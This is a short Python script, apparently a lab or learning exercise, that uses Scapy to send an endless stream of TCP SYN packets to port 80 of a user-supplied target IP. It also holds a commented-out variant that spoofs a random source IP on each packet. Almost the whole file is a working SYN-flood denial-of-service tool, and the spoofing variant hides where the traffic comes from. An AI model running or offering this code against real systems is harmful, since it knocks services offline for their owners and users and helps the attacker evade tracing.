from scapy.all import *

# Take user inputs for source IP, target IP, and source port
source_IP = input("Enter IP address of Source: ")
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number: "))

# Counter for packets sent
i = 1

# Start an infinite loop to send SYN packets
while True:
    # Create an IP packet with source and destination IP
    IP1 = IP(src=source_IP, dst=target_IP)
    
    # Create a TCP packet with source port and destination port 80 (HTTP)
    TCP1 = TCP(sport=source_port, dport=80, flags="S")  # "S" flag stands for SYN
    
    # Combine IP and TCP layers to create the full packet
    pkt = IP1 / TCP1
    
    # Send the crafted packet with a very short interval to simulate high packet sending rate
    send(pkt, inter=0.001)  # Interval of 0.001 seconds between packets

    # Print out the packet count
    print("Packet sent", i)
    i += 1



#Enter IP address of Source: 192.168.1.100 
#Enter IP address of Target: 192.168.1.10         
#Enter Source Port Number: 12345








# IP Spoofing

# from scapy.all import *
# import random

# # Take user inputs for target IP and source port
# target_IP = input("Enter IP address of Target: ")
# source_port = int(input("Enter Source Port Number: "))

# # Counter for packets sent
# i = 1

# # Start an infinite loop to send SYN packets
# while True:
#     # Generate a random source IP address
#     source_IP = RandIP()  # This generates a random IP address

#     # Create an IP packet with spoofed source IP and destination IP
#     IP1 = IP(src=source_IP, dst=target_IP)
    
#     # Create a TCP packet with source port and destination port 80 (HTTP)
#     TCP1 = TCP(sport=source_port, dport=80, flags="S")  # "S" flag stands for SYN
    
#     # Combine IP and TCP layers to create the full packet
#     pkt = IP1 / TCP1
    
#     # Send the crafted packet with a very short interval to simulate high packet sending rate
#     send(pkt, inter=0.001)  # Interval of 0.001 seconds between packets

#     # Print out the packet count
#     print("Packet sent", i)
#     i += 1
